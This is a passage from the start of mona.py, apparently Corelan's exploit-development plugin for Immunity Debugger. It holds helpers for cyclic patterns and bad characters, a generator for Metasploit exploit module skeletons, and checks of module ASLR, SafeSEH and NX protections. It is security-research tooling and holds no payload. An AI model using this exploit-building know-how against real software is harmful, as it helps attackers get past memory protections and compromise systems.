"""
 
U{Corelan<https://www.corelan.be>}

Copyright (c) 2011, Corelan GCV
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
	* Redistributions of source code must retain the above copyright
	notice, this list of conditions and the following disclaimer.
	* Redistributions in binary form must reproduce the above copyright
	notice, this list of conditions and the following disclaimer in the
	documentation and/or other materials provided with the distribution.
	* (Re)distribution of a ported version of parts or all of the source
	or binary version of the source must contain the following acknowledgement :
	This product includes code written by Corelan GCV as part of mona.py
	Additionally, the source or binary using parts of this source code must be
	made available to the public for free.
	* Neither the name of the Corelan Team/Corelan GCV nor the
	names of its contributors may be used to endorse or promote products
	derived from this software without specific prior written permission.
	* You are not allowed to sell this code or modified versions of this source
	nor make available as part of a commercial offering.
	
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL CORELAN GCV BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.)
 
$Revision: 156 $
$Id: mona.py 156 2012-02-23 17:32:05Z corelanc0d3r $ 
"""

__VERSION__ = '1.3-dev'
__IMM__ = '1.8'

import debugger
import immlib
import getopt
import debugtypes
import immutils
from immutils import *
import pefile

import sys
import struct
import string
import time
import datetime
import binascii
import re
import urllib
import shutil
import random

from operator import itemgetter

import traceback
import inspect



DESC = "Corelan Team exploit development swiss army knife / PyCommand for Immunity Debugger"

#---------------------------------------#
#  Global stuff                         #
#---------------------------------------#	

TOP_USERLAND = 0x7fffffff
g_modules={}
ptr_counter = 0
ptr_to_get = -1
silent = False
ignoremodules = False
noheader = False
imm = immlib.Debugger()


#---------------------------------------#
#  Utility functions                    #
#---------------------------------------#	
def toHex(n):
	"""
	Converts a numeric value to hex (pointer to hex)

	Arguments:
	n - the value to convert

	Return:
	A string, representing the value in hex (8 characters long)
	"""
	return "%08x" % n

def toHexByte(n):
	"""
	Converts a numeric value to a hex byte

	Arguments:
	n - the vale to convert (max 255)

	Return:
	A string, representing the value in hex (1 byte)
	"""
	return "%02X" % n

def toAscii(n):
	"""
	Converts a byte to its ascii equivalent. Null byte = space

	Arguments:
	n - A string (2 chars) representing the byte to convert to ascii

	Return:
	A string (one character), representing the ascii equivalent
	"""
	asciiequival = " "
	try:
		if n != "00":
			asciiequival=binascii.a2b_hex(n)
		else:
			asciiequival = " "
	except:
		asciiequival=" "
	return asciiequival

def hex2bin(pattern):
	"""
	Converts a hex string (\\x??\\x??\\x??\\x??) to real hex bytes

	Arguments:
	pattern - A string representing the bytes to convert 

	Return:
	the bytes
	"""
	pattern = pattern.replace("\\x", "")
	pattern = pattern.replace("\"", "")
	pattern = pattern.replace("\'", "")
	cnt = 0
	strb = ""
	while cnt < len(pattern):
		strb += binascii.a2b_hex(pattern[cnt:cnt+2])
		cnt=cnt+2
	return strb
	
def bin2hexstr(binbytes):
	"""
	Converts bytes to a string with hex
	
	Arguments:
	binbytes - the input to convert to hex
	
	Return :
	string with hex
	"""
	
	toreturn=""
	for thisbyte in binbytes:
		toreturn += "\\x%02x" % ord(thisbyte)
		
	return toreturn


def str2js(inputstring):
	"""
	Converts a string to an unicode escaped javascript string
	
	Arguments:
	inputstring - the input string to convert 

	Return :
	string in unicode escaped javascript format
	"""
	length = len(inputstring)
	if length % 2 == 1:
		jsmsg = "Warning : odd size given, js pattern will be truncated to " + str(length - 1) + " bytes, it's better use an even size\n"
		if not silent:
			imm.logLines(jsmsg,highlight=1)
	toreturn=""
	for thismatch in re.compile("..").findall(inputstring):
		thisunibyte = ""
		for thisbyte in thismatch:
			thisunibyte = "%02x" % ord(thisbyte) + thisunibyte
		toreturn += "%u" + thisunibyte
	return toreturn		
	
	
def opcodesToHex(opcodes):
	"""
	Converts pairs of chars (opcode bytes) to hex string notation

	Arguments :
	opcodes : pairs of chars
	
	Return :
	string with hex
	"""
	toreturn = ""
	cnt = 0
	opcodes = opcodes.replace(" ","")
	while cnt < len(opcodes)-1:
		thisbyte = opcodes[cnt:cnt+2]
		toreturn += "\\x" + thisbyte
		cnt += 2
	return toreturn
	
	
def rmLeading(input,toremove,toignore=""):
	"""
	Removes leading characters from an input string
	
	Arguments:
	input - the input string
	toremove - the character to remove from the begin of the string
	toignore - ignore this character
	
	Return:
	the input string without the leading character(s)
	"""
	newstring = ""
	cnt = 0
	while cnt < len(input):
		if input[cnt] != toremove and input[cnt] != toignore:
			break
		cnt += 1
	
	newstring = input[cnt:len(input)]
	return newstring

	
def getVersionInfo(filename):
	"""Retrieves version and revision numbers from a mona file
	
	Arguments : filename
	
	Return :
	version - string with version (or empty if not found)
	revision - string with revision (or empty if not found)
	"""

	file = open(filename,"rb")
	content = file.readlines()
	file.close()
	revision = ""
	version = ""
	for line in content:
		if line.startswith("$Revision"):
			parts = line.split(" ")
			if len(parts) > 1:
				revision = parts[1].replace("$","")
		if line.startswith("__VERSION__"):
			parts = line.split("=")
			if len(parts) > 1:
				version = parts[1].strip()
	return version,revision

	
def toniceHex(data,size):
	"""
	Converts a series of bytes into a hex string, 
	newline after 'size' nr of bytes
	
	Arguments :
	data - the bytes to convert
	size - the number of bytes to show per linecache
	
	Return :
	a multiline string
	"""
	
	cnt = 0
	flip = 1
	thisline = "\""
	block = ""
	
	while cnt < len(data):
		thisline += "\\x%s" % toHexByte(ord(data[cnt]))				
		if (flip == size) or (cnt == len(data)-1):				
			thisline += "\""
			flip = 0
			block += thisline 
			block += "\n"
			thisline = "\""
		cnt += 1
		flip += 1
	return block.lower()
	
def hexStrToInt(inputstr):
	"""
	Converts a string with hex bytes to a numeric value
	Arguments:
	inputstr - A string representing the bytes to convert. Example : 41414141

	Return:
	the numeric value
	"""
	return int(inputstr,16)

	
def toSize(input,size):
	"""
	Adds spaces to a string until the string reaches a certain length

	Arguments:
	input - A string
	size - the destination size of the string 

	Return:
	the expanded string of length <size>
	"""
	i = len(input)
	while i < size:
		input += " "
		i+=1
	return input.ljust(size," ")
	
def toUnicode(input):
	"""
	Converts a series of bytes to unicode bytes
	
	Arguments :
	input - the source bytes
	
	Return:
	the unicode expanded version of the input
	"""
	inputlst = list(input)
	unicodebytes=""
	for inputchar in inputlst:
		unicodebytes += inputchar + '\x00'
	return unicodebytes
	
def toJavaScript(input):
	"""
	Extracts pointers from lines of text
	and returns a javascript friendly version
	"""
	alllines = input.split("\n")
	javascriptversion = ""
	allbytes = ""
	for eachline in alllines:
		thisline = eachline.replace("\t","").lower().strip()
		if not(thisline.startswith("#")):
			if thisline.startswith("0x"):
				theptr = thisline.split(",")[0].replace("0x","")
				# reverse the bytes
				cnt = 0
				newptr = ""
				while cnt <= len(theptr)-2:
					newptr = theptr[cnt]+theptr[cnt+1] + newptr
					cnt += 2
				cnt = 0
				theptr = newptr
				these4bytes = ""
				while cnt <= len(theptr)-2:
					thisbytestring =  hex2bin("\\x" + theptr[cnt]+theptr[cnt+1])
					these4bytes = thisbytestring + these4bytes
					cnt += 2
				allbytes += these4bytes	
	javascriptversion = str2js(allbytes)			
	return javascriptversion
	
	
def isReg(reg):
	"""
	Checks if a given string is a valid reg
	Argument :
	reg  - the register to check
	
	Return:
	Boolean
	"""
	
	regs=["eax","ebx","ecx","edx","esi","edi","ebp","esp"]
	
	return str(reg).lower() in regs
	

def isAddress(string):
	"""
	Check if a string is an address / consists of hex chars only

	Arguments:
	string - the string to check

	Return:
	Boolean - True if the address string only contains hex bytes
	"""
	string = string.replace("\\x","")
	if len(string) > 8:
		return False
	for char in string:
		if char.upper() not in ["A","B","C","D","E","F","1","2","3","4","5","6","7","8","9","0"]:
			return False
	return True

def addrToInt(string):
	"""
	Convert a textual address to an integer

	Arguments:
	string - the address

	Return:
	int - the address value
	"""
	
	string = string.replace("\\x","")
	return hexStrToInt(string)
	
def splitAddress(address):
	"""
	Splits a string (8 chars), representing a dword, into individual bytes (4 bytes)

	Arguments:
	address - The string to split

	Return:
	4 bytes
	"""
	byte1 = address >> 24 & 0xFF
	byte2 = address >> 16 & 0xFF
	byte3 = address >>  8 & 0xFF
	byte4 = address & 0xFF
	
	return byte1,byte2,byte3,byte4

def bytesInRange(address, range):
	"""
	Checks if all bytes of an address are in a range

	Arguments:
	address - the address to check (8 chars, representing a dword)
	range - a range object containing the values all bytes need to comply with

	Return:
	a boolean
	"""
	
	byte1,byte2,byte3,byte4 = splitAddress(address)
	
	# if the first is a null we keep the address anyway
	if not (byte1 == 0 or byte1 in range):
		return False
	elif not byte2 in range:
		return False
	elif not byte3 in range:
		return False
	elif not byte4 in range:
		return False
	
	return True

def readString(address):
	"""
	Reads a string from the given address until it reaches a null bytes

	Arguments:
	address - the base address (integer value)

	Return:
	the string
	"""
	toreturn = ""
	thisbyte=1
	cnt=0
	while thisbyte != 0:
		thischar = imm.readMemory(address+cnt,1)
		thisbyte = ord(thischar)
		if thisbyte != 0:
			toreturn = toreturn + thischar
		cnt += 1
	return toreturn
	
def getStacks():
	"""
	Retrieves all stacks from all threads in the current application

	Arguments:
	None

	Return:
	a dictionary, with key = threadID. Each entry contains an array with base and top of the stack
	"""
	stacks = {}
	threads = imm.getAllThreads() 
	for thread in threads:
		teb = thread.getTEB()
		tid = thread.getId()
		topStack = struct.unpack('<L',imm.readMemory(teb+4,4))[0]
		baseStack = struct.unpack('<L',imm.readMemory(teb+8,4))[0]
		stacks[tid] = [baseStack,topStack]
	return stacks

def meetsAccessLevel(page,accessLevel):
	"""
	Checks if a given page meets a given access level

	Arguments:
	page - a page object
	accesslevel - a string containing one of the following access levels :
	R,W,X,RW,RX,WR,WX,RWX or *

	Return:
	a boolean
	"""
	if "*" in accessLevel:
		return True
	
	pageAccess = page.getAccess(human=True)
	
	if "R" in accessLevel:
		if not "READ" in pageAccess:
			return False
	if "W" in accessLevel:
		if not "WRITE" in pageAccess:
			return False
	if "X" in accessLevel:
		if not "EXECUTE" in pageAccess:
			return False
			
	return True

def splitToPtrInstr(input):
	"""
	Splits a line (retrieved from a mona output file) into a pointer and a string with the instructions in the file

	Arguments:
	input : the line containing pointer and instruction

	Return:
	a pointer - (integer value)
	a string - instruction
	if the input does not contain a valid line, pointer will be set to -1 and string will be empty
	"""	
	
	thispointer = -1
	thisinstruction = ""
	split1 = re.compile(" ")
	split2 = re.compile(":")
	split3 = re.compile("\*\*")
	
	thisline = input.lower()
	if thisline.startswith("0x"):
		#get the pointer
		parts = split1.split(input)
		if len(parts[0]) != 10:
			return thispointer,thisinstruction
		else:
			thispointer = hexStrToInt(parts[0])
			if len(parts) > 1:
				subparts = split2.split(input)
				subpartsall = ""
				if len(subparts) > 1:
					cnt = 1
					while cnt < len(subparts):
						subpartsall += subparts[cnt] + ":"
						cnt +=1
					subsubparts = split3.split(subpartsall)
					thisinstruction = subsubparts[0].strip()
			return thispointer,thisinstruction
	else:
		return thispointer,thisinstruction
		
		
def getNrOfDictElements(thisdict):
	"""
	Will get the total number of entries in a given dictionary
	Argument: the source dictionary
	Output : an integer
	"""
	total = 0
	for dicttype in thisdict:
		for dictval in thisdict[dicttype]:
			total += 1
	return total
		
		
def getPatternLength(startptr,type="normal",args={}):
	"""
	Gets length of a metasploit pattern, starting from a given pointer
	
	Arguments:
	startptr - the start pointer (integer value)
	type - optional string, indicating type of pattern :
		"normal" : normal pattern
		"unicode" : unicode pattern
		"upper" : uppercase pattern
		"lower" : lowercase pattern
	"""
	patternsize = 0
	endofpattern = False
	global silent
	oldsilent=silent
	silent=True
	fullpattern = createPattern(200000,args)
	silent=oldsilent
	if type == "upper":
		fullpattern = fullpattern.upper()
	if type == "lower":
		fullpattern = fullpattern.lower()
	#if type == "unicode":
	#	fullpattern = toUnicode(fullpattern)
	
	if type in ["normal","upper","lower","unicode"]:
		previousloc = -1
		while not endofpattern and patternsize <= len(fullpattern):
			sizemeter=imm.readMemory(startptr+patternsize,4)
			if type == "unicode":
				sizemeter=imm.readMemory(startptr+patternsize,8)
				sizemeter = sizemeter.replace('\x00','')
			else:
				sizemeter=imm.readMemory(startptr+patternsize,4)
			if len(sizemeter) == 4:
				thisloc = fullpattern.find(sizemeter)
				if thisloc < 0 or thisloc <= previousloc:
					endofpattern = True
				else:
					patternsize += 4
					previousloc = thisloc
			else:
				return patternsize
		#maybe this is not the end yet
		patternsize -= 8
		endofpattern = False
		while not endofpattern and patternsize <= len(fullpattern):
			sizemeter=imm.readMemory(startptr+patternsize,4)
			if type == "unicode":
				sizemeter=imm.readMemory(startptr+patternsize,8)
				sizemeter = sizemeter.replace('\x00','')
			else:
				sizemeter=imm.readMemory(startptr+patternsize,4)
			if fullpattern.find(sizemeter) < 0:
				patternsize += 3
				endofpattern = True
			else:		
				patternsize += 1
	if type == "unicode":
		patternsize = (patternsize / 2) + 1
	return patternsize
	
def getAPointer(modules,criteria,accesslevel):
	"""
	Gets the first pointer from one of the supplied module that meets a set of criteria
	
	Arguments:
	modules - array with module names
	criteria - dictionary describing the criteria the pointer needs to comply with
	accesslevel - the required access level
	
	Return:
	a pointer (integer value) or 0 if nothing was found
	"""
	pointer = 0
	imm.getMemoryPages()
	for a in imm.MemoryPages.keys():
			page_start = a
			page_size  = imm.MemoryPages[a].getSize()
			page_end   = a + page_size
			#page in one of the modules ?
			if meetsAccessLevel(imm.MemoryPages[a],accesslevel):
				pageptr = MnPointer(a)
				thismodulename = pageptr.belongsTo()
				if thismodulename != "" and thismodulename in modules:
					thismod = MnModule(thismodulename)
					start = thismod.moduleBase
					end = thismod.moduleTop
					cnt = 0
					random.seed()
					while cnt <= page_size:
						#randomize the value
						theoffset = random.randint(0,page_size)
						thispointer = MnPointer(page_start + theoffset)
						if meetsCriteria(thispointer,criteria):
							return page_start + theoffset
						cnt += 1
	return pointer
	
	
def haveRepetition(string, pos):
	first =  string[pos]
	MIN_REPETITION = 3		
	if len(string) - pos > MIN_REPETITION:
		count = 1
		while ( count < MIN_REPETITION and string[pos+count] ==  first):
			count += 1
		if count >= MIN_REPETITION:
			return True
	return False
	
def isAscii(b):
	"""
	Check if a given hex byte is ascii or not
	
	Argument : the byte
	Returns : Boolean
	"""
	return b == 0x0a or b == 0x0d or (b >= 0x20 and b <= 0x7e)
	
def isAscii2(b):
	"""
	Check if a given hex byte is ascii or not, will not flag newline or carriage return as ascii
	
	Argument : the byte
	Returns : Boolean
	"""
	return b >= 0x20 and b <= 0x7e	
	
def isHexString(input):
	"""
	Checks if all characters in a string are hex (0->9, a->f, A->F)
	Alias for isAddress()
	"""
	return isAddress(input)
	
	
def getSkeletonHeader(exploittype,portnr,extension,url,badchars='\x00\x0a\x0d'):

	originalauthor = "insert_name_of_person_who_discovered_the_vulnerability"
	name = "insert name for the exploit"
	cve = "insert CVE number here"
	
	if url == "":
		url = "<insert another link to the exploit/advisory here>"
	else:
		try:
			# connect to url & get author + app description
			u = urllib.urlretrieve(url)
			# extract title
			FILE = open(u[0],'r')
			contents = FILE.readlines()
			FILE.close()
			for line in contents:
				if line.find('<h1') > -1:
					titleline = line.split('>')
					if len(titleline) > 1:
						name = titleline[1].split('<')[0].replace("\"","").replace("'","").strip()
					break
			for line in contents:
				if line.find('Author:') > -1 and line.find('td style') > -1:
					authorline = line.split("Author:")
					if len(authorline) > 1:
						originalauthor = authorline[1].split('<')[0].replace("\"","").replace("'","").strip()
					break
			for line in contents:
				if line.find('CVE:') > -1 and line.find('td style') > -1:
					cveline = line.split("CVE:")
					if len(cveline) > 1:
						tcveparts = cveline[1].split('>')
						if len(tcveparts) > 1:
							tcve = tcveparts[1].split('<')[0].replace("\"","").replace("'","").strip()
							if tcve.upper().strip() != "N//A":
								cve = tcve
					break					
		except:
			imm.log(" ** Unable to download %s" % url,highlight=1)
			url = "<insert another link to the exploit/advisory here>"
	
	monaConfig = MnConfig()
	thisauthor = monaConfig.get("author")
	if thisauthor == "":
		thisauthor = "<insert your name here>"

	skeletonheader = "##\n"
	skeletonheader += "# This file is part of the Metasploit Framework and may be subject to\n"
	skeletonheader += "# redistribution and commercial restrictions. Please see the Metasploit\n"
	skeletonheader += "# Framework web site for more information on licensing and terms of use.\n"
	skeletonheader += "# http://metasploit.com/framework/\n"
	skeletonheader += "##\n\n"
	skeletonheader += "require 'msf/core'\n\n"
	skeletonheader += "class Metasploit3 < Msf::Exploit::Remote\n"
	skeletonheader += "\t#Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking\n"
	skeletonheader += "\t#ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking\n"
	skeletonheader += "\tRank = NormalRanking\n\n"
	
	if exploittype == "fileformat":
		skeletonheader += "\tinclude Msf::Exploit::FILEFORMAT\n"
	if exploittype == "network client (tcp)":
		skeletonheader += "\tinclude Msf::Exploit::Remote::Tcp\n"
	if exploittype == "network client (udp)":
		skeletonheader += "\tinclude Msf::Exploit::Remote::Udp\n"
		
	if cve.strip() == "":
		cve = "<insert CVE number here>"
		
	skeletoninit = "\tdef initialize(info = {})\n"
	skeletoninit += "\t\tsuper(update_info(info,\n"
	skeletoninit += "\t\t\t'Name'\t\t=> '" + name + "',\n"
	skeletoninit += "\t\t\t'Description'\t=> %q{\n"
	skeletoninit += "\t\t\t\t\tProvide information about the vulnerability / explain as good as you can\n"
	skeletoninit += "\t\t\t\t\tMake sure to keep each line less than 100 columns wide\n"
	skeletoninit += "\t\t\t},\n"
	skeletoninit += "\t\t\t'License'\t\t=> MSF_LICENSE,\n"
	skeletoninit += "\t\t\t'Author'\t\t=>\n"
	skeletoninit += "\t\t\t\t[\n"
	skeletoninit += "\t\t\t\t\t'" + originalauthor + "<user[at]domain.com>',\t# Original discovery\n"
	skeletoninit += "\t\t\t\t\t'" + thisauthor + "',\t# MSF Module\n"		
	skeletoninit += "\t\t\t\t],\n"
	skeletoninit += "\t\t\t'References'\t=>\n"
	skeletoninit += "\t\t\t\t[\n"
	skeletoninit += "\t\t\t\t\t[ 'OSVDB', '<insert OSVDB number here>' ],\n"
	skeletoninit += "\t\t\t\t\t[ 'CVE', '" + cve + "' ],\n"
	skeletoninit += "\t\t\t\t\t[ 'URL', '" + url + "' ]\n"
	skeletoninit += "\t\t\t\t],\n"
	skeletoninit += "\t\t\t'DefaultOptions' =>\n"
	skeletoninit += "\t\t\t\t{\n"
	skeletoninit += "\t\t\t\t\t'ExitFunction' => 'process', #none/process/thread/seh\n"
	skeletoninit += "\t\t\t\t\t#'InitialAutoRunScript' => 'migrate -f',\n"	
	skeletoninit += "\t\t\t\t},\n"
	skeletoninit += "\t\t\t'Platform'\t=> 'win',\n"
	skeletoninit += "\t\t\t'Payload'\t=>\n"
	skeletoninit += "\t\t\t\t{\n"
	skeletoninit += "\t\t\t\t\t'BadChars' => \"" + bin2hexstr(badchars) + "\", # <change if needed>\n"
	skeletoninit += "\t\t\t\t\t'DisableNops' => true,\n"
	skeletoninit += "\t\t\t\t},\n"
	
	skeletoninit2 = "\t\t\t'Privileged'\t=> false,\n"
	skeletoninit2 += "\t\t\t#Correct Date Format: \"M D Y\"\n"
	skeletoninit2 += "\t\t\t#Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec\n"
	skeletoninit2 += "\t\t\t'DisclosureDate'\t=> 'MONTH DAY YEAR',\n"
	skeletoninit2 += "\t\t\t'DefaultTarget'\t=> 0))\n"
	
	if exploittype.find("network") > -1:
		skeletoninit2 += "\n\t\tregister_options([Opt::RPORT(" + str(portnr) + ")], self.class)\n"
	if exploittype.find("fileformat") > -1:
		skeletoninit2 += "\n\t\tregister_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf" + extension + "']),], self.class)\n"
	skeletoninit2 += "\n\tend\n\n"
	
	return skeletonheader,skeletoninit,skeletoninit2

#---------------------------------------#
#   Class to call commands & parse args #
#---------------------------------------#

class MnCommand:
	"""
	Class to call commands, show usage and parse arguments
	"""
	def __init__(self, name, description, usage, parseProc, alias=""):
		self.name = name
		self.description = description
		self.usage = usage
		self.parseProc = parseProc
		self.alias = alias


#---------------------------------------#
#   Class to access config file         #
#---------------------------------------#
class MnConfig:
	"""
	Class to perform config file operations
	"""
	def __init__(self):
	
		self.configfile = "mona.ini"
	
	def get(self,parameter):
		"""
		Retrieves the contents of a given parameter from the config file

		Arguments:
		parameter - the name of the parameter 

		Return:
		A string, containing the contents of that parameter
		"""	
		#read config file
		#format :  parameter=value
		toreturn = ""
		curparam=[]
		if os.path.exists(self.configfile):
			try:
				configfileobj = open(self.configfile,"rb")
				content = configfileobj.readlines()
				configfileobj.close()
				for thisLine in content:
					if not thisLine[0] == "#":
						currparam = thisLine.split('=')
						if currparam[0].strip().lower() == parameter.strip().lower() and len(currparam) > 1:
							#get value
							currvalue = ""
							i=1
							while i < len(currparam):
								currvalue = currvalue + currparam[i] + "="
								i += 1
							toreturn = currvalue.rstrip("=").replace('\n','').replace('\r','')
			except:
				toreturn=""
		
		return toreturn
	
	def set(self,parameter,paramvalue):
		"""
		Sets/Overwrites the contents of a given parameter in the config file

		Arguments:
		parameter - the name of the parameter 
		paramvalue - the new value of the parameter

		Return:
		nothing
		"""		
		if os.path.exists(self.configfile):
			#modify file
			try:
				configfileobj = open(self.configfile,"r")
				content = configfileobj.readlines()
				configfileobj.close()
				newcontent = []
				paramfound = False
				for thisLine in content:
					thisLine = thisLine.replace('\n','').replace('\r','')
					if not thisLine[0] == "#":
						currparam = thisLine.split('=')
						if currparam[0].strip().lower() == parameter.strip().lower():
							newcontent.append(parameter+"="+paramvalue+"\n")
							paramfound = True
						else:
							newcontent.append(thisLine+"\n")
					else:
						newcontent.append(thisLine+"\n")
				if not paramfound:
					newcontent.append(parameter+"="+paramvalue+"\n")
				#save new config file (rewrite)
				imm.log("[+] Saving config file, modified parameter %s" % parameter)
				FILE=open(self.configfile,"w")
				FILE.writelines(newcontent)
				FILE.close()
			except:
				imm.log("Error writing config file : %s : %s" % (sys.exc_type,sys.exc_value),highlight=1)
				return ""
		else:
			#create new file
			try:
				imm.log("[+] Creating config file, setting parameter %s" % parameter)
				FILE=open(self.configfile,"w")
				FILE.write("# -----------------------------------------------#\n")
				FILE.write("# Corelan Team PyCommand for Immunity Debugger   #\n")
				FILE.write("# configuration file                             #\n")
				FILE.write("# -----------------------------------------------#\n")
				FILE.write(parameter+"="+paramvalue+"\n")
				FILE.close()
			except:
				imm.log(" ** Error writing config file", highlight=1)
				return ""
		return ""
	
	
#---------------------------------------#
#   Class to log entries to file        #
#---------------------------------------#
class MnLog:
	"""
	Class to perform logfile operations
	"""
	def __init__(self, filename):
		
		self.filename = filename
		
			
	def reset(self,clear=True):
		"""
		Optionally clears a log file, write a header to the log file and return filename

		Optional :
		clear = Boolean. When set to false, the logfile won't be cleared. This method can be
		used to retrieve the full path to the logfile name of the current MnLog class object
		Logfiles are written to the Immunity Debugger program folder, unless a config value 'workingfolder' is set.

		Return:
		full path to the logfile name.
		"""	
		if clear:
			if not silent:
				imm.log("[+] Preparing log file '" + self.filename +"'")
		debuggedname = imm.getDebuggedName()
		thispid = imm.getDebuggedPid()
		if thispid == 0:
			debuggedname = "_no_name_"
		thisconfig = MnConfig()
		workingfolder = thisconfig.get("workingfolder").rstrip("\\").strip()
		#strip extension from debuggedname
		parts = debuggedname.split(".")
		extlen = len(parts[len(parts)-1])+1
		debuggedname = debuggedname[0:len(debuggedname)-extlen]
		debuggedname = debuggedname.replace(" ","_")
		workingfolder = workingfolder.replace('%p', debuggedname)
		workingfolder = workingfolder.replace('%i', str(thispid))		
		logfile = workingfolder + "\\" + self.filename
		#does working folder exist ?
		if workingfolder != "":
			if not os.path.exists(workingfolder):
				try:
					imm.log("    - Creating working folder %s" % workingfolder)
					#recursively create folders
					os.makedirs(workingfolder)
					imm.log("    - Folder created")
				except:
					imm.log("   ** Unable to create working folder %s, Immunity Folder will be used instead" % workingfolder,highlight=1)
					logfile = self.filename
		else:
			logfile = self.filename
		if clear:
			if not silent:
				imm.log("    - (Re)setting logfile %s" % logfile)
			try:
				if os.path.exists(logfile):
					try:
						os.delete(logfile+".old")
					except:
						pass
					try:
						os.rename(logfile,logfile+".old")
					except:
						try:
							os.rename(logfile,logfile+".old2")
						except:
							pass
			except:
				pass
			#write header
			if not noheader:
				try:
					FILE=open(logfile,"w")
					FILE.write("=" * 80)
					FILE.write("\n  Output generated by mona.py v"+__VERSION__+"\n")
					FILE.write("  Corelan Team - https://www.corelan.be\n")
					FILE.write("=" * 80)
					osver=imm.getOsVersion()
					osrel=imm.getOsRelease()
					FILE.write("\n  OS : " + osver + ", release " + osrel+"\n")
					FILE.write("  Process being debugged : " + debuggedname +" (pid " + str(thispid) + ")\n")
					FILE.write("=" * 80)
					FILE.write("\n  " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
					FILE.write("=" * 80)
					FILE.write("\n")
					FILE.close()
				except:
					pass
			else:
				try:
					FILE=open(logfile,"w")
					FILE.write("")
					FILE.close()
				except:
					pass
			#write module table
			try:
				if not ignoremodules:
					showModuleTable(logfile)
			except:
				pass
		return logfile
		
	def write(self,entry,logfile):
		"""
		Write an entry (can be multiline) to a given logfile

		Arguments:
		entry - the data to write to the logfile
		logfile - the full path to the logfile

		Return:
		nothing
		"""		
		towrite = ""
		#check if entry is int 
		if type(entry) == int:
			if entry > 0:
				ptrx = MnPointer(entry)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				towrite = "0x" + toHex(entry) + " : " + ptrx.__str__() + " " + modinfo.__str__()
			else:
				towrite = entry
		else:
			towrite = entry
		towrite = str(towrite)
		try:
			FILE=open(logfile,"a")
			if towrite.find('\n') > -1:
				FILE.writelines(towrite)
			else:
				FILE.write(towrite+"\n")
			FILE.close()
		except:
			pass
		return True
	
	
#---------------------------------------#
#  Class to access module properties    #
#---------------------------------------#
	
class MnModule:
	"""
	Class to access module properties
	"""
	def __init__(self, modulename):
		
		modisaslr = True
		modissafeseh = True
		modrebased = True
		modisnx = True
		modisos = True
		path = ""
		mzbase = 0
		mzsize = 0
		mztop = 0
		mversion = ""
		if modulename != "":
			# if info is cached, retrieve from cache
			if ModInfoCached(modulename):
				modisaslr = getModuleProperty(modulename,"aslr")
				modissafeseh = getModuleProperty(modulename,"safeseh")
				modrebased = getModuleProperty(modulename,"rebase")
				modisnx = getModuleProperty(modulename,"nx")
				modisos = getModuleProperty(modulename,"os")
				path = getModuleProperty(modulename,"path")
				mzbase = getModuleProperty(modulename,"base")
				mzsize = getModuleProperty(modulename,"size")
				mztop = getModuleProperty(modulename,"top")
				mversion = getModuleProperty(modulename,"version")
			else:
				#gather info manually - this code should only get called from populateModuleInfo()
				self.module = imm.getModule(modulename)	
				modissafeseh = True
				modisaslr = True
				modisnx = True
				modrebased = False
				modisos = False
				
				mod=self.module
				mzbase=mod.getBaseAddress()
				mzrebase=mod.getFixupbase()
				mzsize=mod.getSize()
				mversion=mod.getVersion()
				
				mversion=mversion.replace(", ",".")
				mversionfields=mversion.split('(')
				mversion=mversionfields[0].replace(" ","")
								
				if mversion=="":
					mversion="-1.0-"
				path=mod.getPath()
				osmod=mod.getIssystemdll()
				if osmod==0:
					modisos = False
					if path.upper().find("WINDOWS") > -1:
						modisos = True
				else:
					modisos = True
				mztop=mzbase+mzsize
				if mzbase > 0:
					peoffset=struct.unpack('<L',imm.readMemory(mzbase+0x3c,4))[0]
					pebase=mzbase+peoffset				
					osver=imm.getOsVersion()
					safeseh_offset = [0x5f, 0x5f, 0x5e]
					safeseh_flag = [0x4, 0x4, 0x400]
					os_index = 0
					# Vista / Win7
					if osver == "6" or osver == "7" or osver == "vista" or osver == "win7" or osver == "2008server":
						os_index = 2
					flags=struct.unpack('<H',imm.readMemory(pebase+safeseh_offset[os_index],2))[0]
					numberofentries=struct.unpack('<L',imm.readMemory(pebase+0x74,4))[0]
					#safeseh ?
					if (flags&safeseh_flag[os_index])!=0:
						modissafeseh=True
					else:
						if numberofentries>10:
							sectionaddress,sectionsize=struct.unpack('<LL',imm.readMemory(pebase+0x78+8*10,8))
							sectionaddress+=mzbase
							data=struct.unpack('<L',imm.readMemory(sectionaddress,4))[0]
							condition = False
							if os_index < 2:
								condition=(sectionsize!=0) and ((sectionsize==0x40) or (sectionsize==data))
							else:
								condition=(sectionsize!=0) and ((sectionsize==0x40))
							if condition==False:
								modissafeseh=False
							else:
								sehlistaddress,sehlistsize=struct.unpack('<LL',imm.readMemory(sectionaddress+0x40,8))
								if sehlistaddress!=0 and sehlistsize!=0:
									modissafeseh=True
								else:
									modissafeseh=False
				
					#aslr
					if (flags&0x0040)==0:  # 'IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
						modisaslr=False
					#nx
					if (flags&0x0100)==0:
						modisnx=False
					#rebase
					if mzrebase <> mzbase:
						modrebased=True
		
		#check if module is excluded
		thisconfig = MnConfig()
		allexcluded = []
		excludedlist = thisconfig.get("excluded_modules")
		modfound = False
		if excludedlist:
			allexcluded = excludedlist.split(',')
			for exclentry in allexcluded:
